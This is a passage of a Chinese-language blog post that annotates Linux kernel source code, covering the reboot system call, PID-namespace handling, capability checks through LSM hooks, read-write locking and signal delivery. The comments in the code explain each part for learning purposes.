class="hljs-comment">/* Instead of trying to make the power_off code look like</span><br><span class="hljs-comment"> * halt when pm_power_off is not set do it the easy way.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((cmd == LINUX_REBOOT_CMD_POWER_OFF) &amp;&amp; !pm_power_off)<br>cmd = LINUX_REBOOT_CMD_HALT;<br><span class="hljs-comment">//* LINUX_REBOOT_CMD_POWER_OFF 如果可能，停止操作系统并断开系统的所有电源。</span><br>    <span class="hljs-comment">//* LINUX_REBOOT_CMD_HALT 停止操作系统并将系统控制权交给 ROM 监视器（如果有）。</span><br>    <br>    <br>mutex_lock(&amp;reboot_mutex);<span class="hljs-comment">//获取互斥信号量</span><br><br>    <br><span class="hljs-keyword">switch</span> (cmd) &#123;<br>    <span class="hljs-comment">//RESTART 使用默认命令和模式重新启动系统。</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_RESTART:<br>kernel_restart(<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-comment">//CAD_ON Ctrl-Alt-Del 序列导致 RESTART 命令。</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_CAD_ON:<br>C_A_D = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-comment">//CAD_OFF Ctrl-Alt-Del 序列将 SIGINT 发送到 init 任务。</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_CAD_OFF:<br>C_A_D = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-comment">//HALT 停止操作系统并将系统控制权交给 ROM 监视器（如果有）。</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_HALT:<br>kernel_halt();<br>do_exit(<span class="hljs-number">0</span>);<br>panic(<span class="hljs-string">&quot;cannot halt&quot;</span>);<br><br>    <span class="hljs-comment">//POWER_OFF 如果可能，停止操作系统并断开系统的所有电源。</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_POWER_OFF:<br>kernel_power_off();<br>do_exit(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">break</span>;<br><br>    <span class="hljs-comment">//RESTART2 使用给定的命令字符串重新启动系统。</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_RESTART2:<br>ret = strncpy_from_user(&amp;buffer[<span class="hljs-number">0</span>], arg, <span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>ret = -EFAULT;<span class="hljs-comment">/* 错误地址 */</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>buffer[<span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>kernel_restart(buffer);<br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEXEC_CORE</span><br>            <br>    <span class="hljs-comment">//KEXEC 使用先前加载的 Linux 内核重新启动系统</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_KEXEC:<br>ret = kernel_kexec();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HIBERNATION</span><br>    <span class="hljs-comment">//SW_SUSPEND 使用软件挂起系统。</span><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_SW_SUSPEND:<br>ret = hibernate();<br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-keyword">default</span>:<br>ret = -EINVAL;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>mutex_unlock(&amp;reboot_mutex);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="task-active-pid-ns"><a href="#task-active-pid-ns" class="headerlink" title="task_active_pid_ns()"></a>task_active_pid_ns()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//获取任务的命名空间信息</span><br><br><span class="hljs-comment">//命名空间，namespace 是 Linux 内核用来隔离内核资源的方式。通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，这两拨进程根本就感觉不到对方的存在。</span><br><span class="hljs-keyword">struct</span> pid_namespace *<span class="hljs-title function_">task_active_pid_ns</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk)</span><br>&#123;<br><span class="hljs-comment">//首先调用函数task_pid()获得任务字段pids[PIDTYPE_PID]的pid值，然后调用函数ns_of_pid()获取函数task_pid()返回值的命名空间信息。</span><br><span class="hljs-keyword">return</span> ns_of_pid(task_pid(tsk));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ns-capable"><a href="#ns-capable" class="headerlink" title="ns_capable()"></a>ns_capable()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断ns是否有需要的权限</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">ns_capable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_namespace *ns, <span class="hljs-type">int</span> cap)</span><br>&#123;<br><span class="hljs-keyword">return</span> ns_capable_common(ns, cap, CAP_OPT_NONE);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ns-capable-common"><a href="#ns-capable-common" class="headerlink" title="ns_capable_common()"></a>ns_capable_common()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断ns是否有指定的权限</span><br><span class="hljs-comment">//cap：指定的权限（宏）</span><br><span class="hljs-comment">//opts：指定函数的其他选项和行为</span><br><span class="hljs-comment">//例如： 0：只检查当前ns</span><br><span class="hljs-comment">//CHECK_ANCESTORS：还检查祖先进程的ns</span><br><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">ns_capable_common</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> user_namespace *ns,</span><br><span class="hljs-params">                        <span class="hljs-type">int</span> cap,</span><br><span class="hljs-params">                        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> opts)</span><br>&#123;<br><span class="hljs-type">int</span> capable;<br>    <span class="hljs-comment">//unlikely：表示执行else的可能性更大，方便编译减少指令跳转</span><br>    <span class="hljs-keyword">if</span> (unlikely(!cap_valid(cap))) &#123;<span class="hljs-comment">//cap_valid宏定义</span><br>        pr_crit(<span class="hljs-string">&quot;capable() called with invalid cap=%u\n&quot;</span>, cap);<span class="hljs-comment">//pr_crit宏定义</span><br>        BUG();<span class="hljs-comment">//BUG宏定义</span><br>        &#125;<br><span class="hljs-comment">//security_capable函数</span><br>    capable = security_capable(current_cred(), ns, cap, opts);<br>    <span class="hljs-keyword">if</span> (capable == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">//如果有对应权限，在task上设置PF_SUPERPRIV（超级权限）</span><br>        current-&gt;flags |= PF_SUPERPRIV;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="宏BUG"><a href="#宏BUG" class="headerlink" title="宏BUG()"></a>宏BUG()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//打印BUG日志：文件名、行号、函数名</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUG()do &#123;\</span><br><span class="hljs-meta">pr_warn(<span class="hljs-string">&quot;BUG: failure at %s:%d/%s()!\n&quot;</span>, __FILE__, __LINE__, __func__); \</span><br><span class="hljs-meta">barrier_before_unreachable();<span class="hljs-comment">//防止程序继续执行的安全措施\</span></span><br><span class="hljs-comment"><span class="hljs-meta">__builtin_trap();//内置函数，使程序中断\</span></span><br><span class="hljs-comment"><span class="hljs-meta">&#125; while (0)</span></span><br></code></pre></td></tr></table></figure><h5 id="宏pr-crit"><a href="#宏pr-crit" class="headerlink" title="宏pr_crit()"></a>宏pr_crit()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//打印信息</span><br><span class="hljs-comment">//KERN_CRIT：指示严重的错误情况</span><br><span class="hljs-comment">//pr_fmt(fmt)：格式化字符串参数</span><br><span class="hljs-comment">//##__VA_ARGS__：可变参数</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pr_crit(fmt, ...) \</span><br><span class="hljs-meta">printk(KERN_CRIT pr_fmt(fmt), ##__VA_ARGS__)</span><br></code></pre></td></tr></table></figure><h5 id="宏cap-valid"><a href="#宏cap-valid" class="headerlink" title="宏cap_valid()"></a>宏cap_valid()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//cap_valid用来检查 cap所表示的权能是否在内核事先定义的权限范围内. 真正的权能检查是在security_capable中</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> cap_valid(x) ((x) &gt;= 0 &amp;&amp; (x) &lt;= CAP_LAST_CAP)</span><br></code></pre></td></tr></table></figure><h5 id="security-capable"><a href="#security-capable" class="headerlink" title="security_capable()"></a>security_capable()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//判断特定进程是否具有执行特定操作所需的能力</span><br><span class="hljs-comment">//struct cred 对象包含有关进程的有效、真实和保存的用户和组 ID 及其功能的信息。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">security_capable</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> cred *cred,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> user_namespace *ns,</span><br><span class="hljs-params">     <span class="hljs-type">int</span> cap,</span><br><span class="hljs-params">     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> opts)</span><br>&#123;<br><span class="hljs-keyword">return</span> call_int_hook(capable, <span class="hljs-number">0</span>, cred, ns, cap, opts);<span class="hljs-comment">//钩子函数调用capable()</span><br>&#125;<br></code></pre></td></tr></table></figure><h6 id="宏call-int-hook"><a href="#宏call-int-hook" class="headerlink" title="宏call_int_hook()"></a>宏call_int_hook()</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">///security/security.c</span><br><span class="hljs-comment">//调用注册的权限检查算法的具体实现函数，依次调用安装到钩子上的安全模块函数进行检查</span><br><span class="hljs-comment">//FUNC：调用的函数</span><br><span class="hljs-comment">//IRC：保存函数的返回值</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;\</span><br><span class="hljs-meta">int RC = IRC;\</span><br><span class="hljs-meta">do &#123;\</span><br><span class="hljs-meta">struct security_hook_list *P;\</span><br><span class="hljs-meta">\</span><br><span class="hljs-meta"><span class="hljs-comment">//hlist_for_each_entry访问hash链表</span></span><br><span class="hljs-comment">//LSM 中使用security_hook_heads 将各访问控制模块的接口管理起来</span><br>hlist_for_each_entry(P, &amp;security_hook_heads.FUNC, <span class="hljs-built_in">list</span>) &#123; \<br>RC = P-&gt;hook.FUNC(__VA_ARGS__);\<span class="hljs-comment">//调用钩子上的安全模块函数</span><br><span class="hljs-keyword">if</span> (RC != <span class="hljs-number">0</span>)\<br><span class="hljs-keyword">break</span>;\<br>&#125;\<br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>);\<br>RC;\<br>&#125;)<br><br></code></pre></td></tr></table></figure><h3 id="reboot-pid-ns"><a href="#reboot-pid-ns" class="headerlink" title="reboot_pid_ns()"></a>reboot_pid_ns()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">reboot_pid_ns</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pid_namespace *pid_ns, <span class="hljs-type">int</span> cmd)</span><br>&#123;<br><span class="hljs-keyword">if</span> (pid_ns == &amp;init_pid_ns)<span class="hljs-comment">//根ns</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">//非根ns的情况</span><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_RESTART2:<br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_RESTART:<br>pid_ns-&gt;reboot = SIGHUP;<span class="hljs-comment">//用于指示终端已断开连接</span><br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_POWER_OFF:<br><span class="hljs-keyword">case</span> LINUX_REBOOT_CMD_HALT:<br>pid_ns-&gt;reboot = SIGINT;<span class="hljs-comment">//终止进程信号</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EINVAL;<span class="hljs-comment">//表示将无效参数传递给函数时发生的错误情况。</span><br>&#125;<br><br>read_lock(&amp;tasklist_lock);<span class="hljs-comment">//获取共享锁</span><br>send_sig(SIGKILL, pid_ns-&gt;child_reaper, <span class="hljs-number">1</span>);<span class="hljs-comment">//发送信号停止进程</span><br>read_unlock(&amp;tasklist_lock);<span class="hljs-comment">//释放共享锁</span><br><br>do_exit(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">/* Not reached */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="read-lock"><a href="#read-lock" class="headerlink" title="read_lock()"></a>read_lock()</h4><p>宏，定义为：__raw_read_lock(rwlock_t *lock)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//read_lock() 函数用于获取 tasklist_lock 变量上的共享锁。共享锁允许多个线程或进程同时读取共享资源，但它会阻止其中任何一个线程或进程修改资源，直到锁被释放</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __raw_read_lock(<span class="hljs-type">rwlock_t</span> *lock)<br>&#123;<br>preempt_disable();<span class="hljs-comment">//禁用内核抢占</span><br>rwlock_acquire_read(&amp;lock-&gt;dep_map, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, _RET_IP_);<span class="hljs-comment">//获取锁</span><br>    <br>    <span class="hljs-comment">//LOCK_CONTENDED() 宏用于处理锁当前被另一个任务持有并且调用任务无法获取锁的情况。该宏可以使用一个循环来实现，该循环反复尝试使用提供的函数指针获取锁，直到成功为止。</span><br>    <span class="hljs-comment">//do_raw_read_trylock 是一个函数指针，被调用以尝试获取锁。第三个参数 do_raw_read_lock 是一个函数指针，如果 do_raw_read_trylock 函数失败，将调用它来获取锁。</span><br>LOCK_CONTENDED(lock, do_raw_read_trylock, do_raw_read_lock);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="preempt-disable"><a href="#preempt-disable" class="headerlink" title="preempt_disable()"></a>preempt_disable()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//禁用内核抢占</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">preempt_disable</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<span class="hljs-comment">//如果传递给 BUG_ON 的条件为真，内核将打印一条错误消息并停止系统。</span><br>    <span class="hljs-comment">//preempt_disable_count:禁用内核抢占的次数</span><br>BUG_ON(preempt_disable_count &lt; <span class="hljs-number">0</span> || preempt_disable_count == INT_MAX);<br><br>    <span class="hljs-comment">//确保多次调用 preempt_disable() 不会导致抢占锁被多次获取</span><br><span class="hljs-keyword">if</span> (preempt_disable_count++)<br><span class="hljs-keyword">return</span>;<br><br>thread_cpu_id = nondet_int();<span class="hljs-comment">//设定一个不确定的整数</span><br><span class="hljs-comment">//指定thread_cpu_id必须&gt;=0且小于CPU总数</span><br>    assume(thread_cpu_id &gt;= <span class="hljs-number">0</span>);<br>assume(thread_cpu_id &lt; NR_CPUS);<span class="hljs-comment">//NR_CPUS：用于指定特定系统或内核旨在支持的最大 CPU 数量</span><br>    <span class="hljs-comment">//为指定的cpu获取抢占锁，防止任何在同一 CPU 上运行的任务在锁被释放之前被抢占。</span><br>    <span class="hljs-comment">//cpu_preemption_locks：数组，数组的每个元素都对应一个特定的 CPU，并持有一个锁，可以获取该锁以防止在该 CPU 上运行的任务被抢占。</span><br>lock_impl_lock(&amp;cpu_preemption_locks[thread_cpu_id]);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="rwlock-acquire-read"><a href="#rwlock-acquire-read" class="headerlink" title="rwlock_acquire_read()"></a>rwlock_acquire_read()</h5><p>宏，定义为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">lock_acquire</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> lockdep_map *lock, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> subclass,</span><br><span class="hljs-params">  <span class="hljs-type">int</span> trylock, <span class="hljs-type">int</span> read, <span class="hljs-type">int</span> check,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> lockdep_map *nest_lock, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>    <span class="hljs-comment">//如果 lockdep_recursion 的值为非零，则表明该函数当前正在以递归方式执行，可能是因为它多次获取了同一个锁。</span><br><span class="hljs-keyword">if</span> (unlikely(current-&gt;lockdep_recursion))<br><span class="hljs-keyword">return</span>;<br><br>raw_local_irq_save(flags);<span class="hljs-comment">//保存标志寄存器值和状态标志，防止中断干扰锁操作</span><br>check_flags(flags);<span class="hljs-comment">//确保标志寄存器有效值</span><br><br>current-&gt;lockdep_recursion = <span class="hljs-number">1</span>;<span class="hljs-comment">//跟踪当前函数递归级别</span><br>trace_lock_acquire(lock, subclass, trylock, read, check, nest_lock, ip);<span class="hljs-comment">//跟踪锁的获取时间</span><br>__lock_acquire(lock, subclass, trylock, read, check,<br>       irqs_disabled_flags(flags), nest_lock, ip, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//获取锁</span><br>current-&gt;lockdep_recursion = <span class="hljs-number">0</span>;<br>raw_local_irq_restore(flags);<span class="hljs-comment">//恢复标志寄存器</span><br>&#125;<br></code></pre></td></tr></table></figure><h6 id="lock-acquire"><a href="#lock-acquire" class="headerlink" title="__lock_acquire()"></a>__lock_acquire()</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">lock：指向 struct lockdep_map 的指针，它指定要获取的锁。</span><br><span class="hljs-comment">subclass：一个无符号整数，指定锁的子类。</span><br><span class="hljs-comment">trylock：一个标志，指定函数是应该尝试获取锁还是等到它可用。</span><br><span class="hljs-comment">read：标志，指定锁是读锁还是写锁。</span><br><span class="hljs-comment">check：一个标志，指定函数在获取锁之前是否应该执行各种检查。</span><br><span class="hljs-comment">hardirqs_off：一个标志，指定当前是否禁用硬中断。</span><br><span class="hljs-comment">nest_lock：指向指定嵌套锁的 struct lockdep_map 的指针。</span><br><span class="hljs-comment">ip：一个无符号长整型，指定调用函数的指令指针。</span><br><span class="hljs-comment">references：一个整数，指定对锁的引用数。</span><br><span class="hljs-comment">pin_count：一个整数，指定锁的 pin 计数。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __lock_acquire(<span class="hljs-keyword">struct</span> lockdep_map *lock, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> subclass,<br>  <span class="hljs-type">int</span> trylock, <span class="hljs-type">int</span> read, <span class="hljs-type">int</span> check, <span class="hljs-type">int</span> hardirqs_off,<br>  <span class="hljs-keyword">struct</span> lockdep_map *nest_lock, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip,<br>  <span class="hljs-type">int</span> references, <span class="hljs-type">int</span> pin_count)<br></code></pre></td></tr></table></figure><h4 id="send-sig"><a href="#send-sig" class="headerlink" title="send_sig()"></a>send_sig()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//向进程发送信号</span><br><span class="hljs-comment">//sig：一个整数，指定要发送的信号。</span><br><span class="hljs-comment">//p：指向 struct task_struct 的指针，它指定信号要发送到的进程</span><br><span class="hljs-comment">//priv：一个整数，指定信号是否从特权进程发送。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">send_sig</span><span class="hljs-params">(<span class="hljs-type">int</span> sig, <span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> priv)</span><br>&#123;<br><span class="hljs-keyword">return</span> send_sig_info(sig, __si_special(priv), p);<br>&#125;<br><br><br><span class="hljs-comment">//info：指向 struct kernel_siginfo 的指针，它指定有关信号的附加信息。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">send_sig_info</span><span class="hljs-params">(<span class="hljs-type">int</span> sig, <span class="hljs-keyword">struct</span> kernel_siginfo *info, <span class="hljs-keyword">struct</span> task_struct *p)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Make sure legacy kernel users don&#x27;t send in bad values</span><br><span class="hljs-comment"> * (normal paths check this in check_kill_permission).</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-comment">//确保信号有效</span><br><span class="hljs-keyword">if</span> (!valid_signal(sig))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">return</span> do_send_sig_info(sig, info, p, PIDTYPE_PID);<br>&#125;<br><br><span class="hljs-comment">//type：类型为 enum pid_type 的枚举值，指定在 p 参数中传递的 PID 类型。</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">do_send_sig_info</span><span class="hljs-params">(<span class="hljs-type">int</span> sig, <span class="hljs-keyword">struct</span> kernel_siginfo *info, <span class="hljs-keyword">struct</span> task_struct *p,</span><br><span class="hljs-params"><span class="hljs-keyword">enum</span> pid_type type)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><span class="hljs-type">int</span> ret = -ESRCH;<span class="hljs-comment">//ESRCH 是预定义的错误代码，表示找不到请求的进程或资源。</span><br><br>    <span class="hljs-comment">//调用 lock_task_sighand() 函数为 p 指定的进程获取 sighand 锁。 sighand 锁是一个自旋锁，用于保护进程的信号处理数据结构。如果无法获取锁，则函数返回 -ESRCH 以指示未找到该进程。</span><br><span class="hljs-keyword">if</span> (lock_task_sighand(p, &amp;flags)) &#123;<br>ret = send_signal(sig, info, p, type);<br>unlock_task_sighand(p, &amp;flags);<br>        <span class="hljs-comment">//函数调用send_signal()函数发送信号。 send_signal() 函数被传递给 sig、info、p 和类型参数。发送信号后，该函数使用 unlock_task_sighand() 函数释放 sighand 锁并返回 ret 的值。</span><br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="read-unlock"><a href="#read-unlock" class="headerlink" title="read_unlock()"></a>read_unlock()</h4><p>宏，定义为_raw_read_unlock</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __lockfunc _raw_read_unlock(<span class="hljs-type">rwlock_t</span> *lock)<br>&#123;<br>__raw_read_unlock(lock);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> __raw_read_unlock(<span class="hljs-type">rwlock_t</span> *lock)<br>&#123;<br>rwlock_release(&amp;lock-&gt;dep_map, <span class="hljs-number">1</span>, _RET_IP_);<span class="hljs-comment">//跟踪锁及其依赖关系，进行检查</span><br>do_raw_read_unlock(lock);<span class="hljs-comment">//释放读写锁</span><br>preempt_enable();<span class="hljs-comment">//允许抢占</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="rwlock-release"><a href="#rwlock-release" class="headerlink" title="rwlock_release()"></a>rwlock_release()</h5><p>宏，定义为lock_release</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 